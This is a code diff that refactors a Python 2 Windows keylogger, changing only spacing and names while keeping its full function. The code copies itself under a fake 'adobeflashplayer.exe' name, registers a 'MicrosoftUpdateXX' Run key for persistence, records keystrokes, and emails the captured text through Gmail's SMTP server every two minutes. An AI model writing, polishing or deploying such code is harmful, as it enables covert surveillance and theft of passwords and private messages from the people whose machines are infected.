@@ -18,28 +18,26 @@ if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
     print "nope"
     sys.exit(0)
 
-x=''
-data=''
-count=0
+x, data, count= '', '', 0
 
-dir = "C:\\Users\\Public\\Libraries\\adobeflashplayer.exe"
+dir = r"C:\Users\Public\Libraries\adobeflashplayer.exe"
 
 def startup():
-    shutil.copy(sys.argv[0],dir)
+    shutil.copy(sys.argv[0], dir)
     aReg = ConnectRegistry(None,HKEY_CURRENT_USER)
     aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
-    SetValueEx(aKey,"MicrosoftUpdateXX",0, REG_SZ, dir)	
-if path.isfile(dir) == False:
+    SetValueEx(aKey,"MicrosoftUpdateXX", 0, REG_SZ, dir)	
+if not path.isfile(dir):
     startup()	
 
-class TimerClass(threading.Thread):
+class Timer(threading.Thread):
     def __init__(self):
         threading.Thread.__init__(self)
         self.event = threading.Event()
     def run(self):
         while not self.event.is_set():
             global data
-            if len(data)>50:
+            if len(data) > 50:
                 ts = datetime.datetime.now()
                 SERVER = "smtp.gmail.com"
                 PORT = 587
@@ -57,19 +55,19 @@ Subject: %s
 """ % (FROM, ", ".join(TO), SUBJECT, MESSAGE)
                 try:
                     server = smtplib.SMTP()
-                    server.connect(SERVER,PORT)
+                    server.connect(SERVER, PORT)
                     server.starttls()
-                    server.login(USER,PASS)
+                    server.login(USER, PASS)
                     server.sendmail(FROM, TO, message)
-                    data=''
+                    data = ''
                     server.quit()
-                except Exception as e:
-                    print e
+                except Exception as error:
+                    print error
             self.event.wait(120)
 
 def main():
     global x
-    em4=TimerClass()
+    em4 = Timer()
     em4.start()
     return True
 
@@ -78,9 +76,9 @@ if __name__ == '__main__':
 
 def pushing(event):
     global x,data
-    if event.Ascii==13:
+    if event.Ascii == 13:
         kkss=' [ENTER] '
-    elif event.Ascii==8:
+    elif event.Ascii == 8:
         kkss=' [BACKSPACE] '
     elif (event.Ascii == 162 or event.Ascii == 163):
         kkss = ' [CTRL] '
